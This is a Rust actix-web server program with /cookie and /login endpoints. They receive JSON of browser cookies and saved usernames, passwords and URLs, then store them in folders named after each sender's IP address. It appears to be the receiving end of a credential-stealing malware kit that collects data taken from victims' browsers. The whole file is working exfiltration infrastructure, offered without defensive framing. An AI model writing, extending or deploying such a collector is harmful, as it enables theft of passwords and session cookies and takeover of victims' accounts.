use actix_web::{web, App, HttpRequest, HttpResponse, HttpServer, Responder};
use chrono::{Timelike, Utc};
use serde_json::{json, Value};
use std::fs;
use std::path::Path;
use std::{collections::HashMap, fs::File};
mod models;

async fn get_filename(foldername: String, filename: String, filenum: String) -> String {
    format!("{}/{}_{}.json", &foldername, &filename, &filenum)
}

async fn write_document(req: HttpRequest, filename: String, data: Value) -> Result<bool, bool> {
    let mut foldername = "no-ip".to_string();
    let mut filenum = 0;
    if let Some(ip_addr) = req.peer_addr() {
        foldername = format!("data/{}", ip_addr.ip().to_string())
    }
    while Path::new(
        &get_filename(
            foldername.to_string(),
            filename.to_string(),
            filenum.to_string(),
        )
        .await,
    )
    .exists()
    {
        filenum += 1;
    }
    match fs::create_dir_all(&foldername) {
        _ => {}
    }
    let filewriter = &File::create(
        &get_filename(
            foldername.to_string(),
            filename.to_string(),
            filenum.to_string(),
        )
        .await,
    );
    match filewriter {
        Ok(filehandle) => match serde_json::to_writer(filehandle, &data) {
            Ok(_) => {
                let now = Utc::now();
                let (is_pm, hour) = now.hour12();
                let current_time = format!(
                    "{:02}:{:02}:{:02} {}",
                    hour,
                    now.minute(),
                    now.second(),
                    if is_pm { "PM" } else { "AM" }
                );
                println!(
                    "{} -> Got {} file from: {}",
                    current_time, &filename, &foldername
                );
                Ok(true)
            }
            Err(_) => Err(false),
        },
        Err(_) => {
            println!("[-] Error writing file - server doesn't have permission to write here.");
            Err(true)
        }
    }
}

async fn parse_cookie(
    req: HttpRequest,
    cookie_obj: web::Json<HashMap<String, Vec<models::Cookie>>>,
) -> impl Responder {
    let mut cookies = json!({});
    for (url, val) in cookie_obj.iter() {
        cookies[&url] = json!([]);
        for cookie in val {
            cookies[&url]
                .as_array_mut()
                .unwrap()
                .push(json!({"domain": cookie.domain, "name": cookie.name, "value": cookie.value}))
        }
    }
    let filename = "cookie".to_string();
    match write_document(req, filename, cookies).await {
        Ok(_) => HttpResponse::Ok(),
        Err(_) => HttpResponse::InternalServerError(),
    }
}
async fn parse_login(
    req: HttpRequest,
    login_obj: web::Json<HashMap<String, Vec<models::Login>>>,
) -> impl Responder {
    let mut logins = json!({});
    for (url, val) in login_obj.iter() {
        logins[&url] = json!([]);
        for login in val {
            if !login.url.is_empty() && !login.username.is_empty() && !login.password.is_empty() {
                logins[&url].as_array_mut().unwrap().push(
                    json!({"url": login.url, "username": login.username, "password": login.password}),
                )
            }
        }
    }
    let filename = "login".to_string();
    match write_document(req, filename, logins).await {
        Ok(_) => HttpResponse::Ok(),
        Err(_) => HttpResponse::InternalServerError(),
    };
    HttpResponse::Ok()
}

#[actix_web::main]
async fn main() -> std::io::Result<()> {
    println!("Waiting for connections...");
    HttpServer::new(|| {
        App::new()
            .data(web::JsonConfig::default().limit(1024 * 1024 * 50))
            .service(web::resource("/cookie").route(web::post().to(parse_cookie)))
            .service(web::resource("/login").route(web::post().to(parse_login)))
    })
    .bind("0.0.0.0:<<PORT>>")?
    .run()
    .await
}
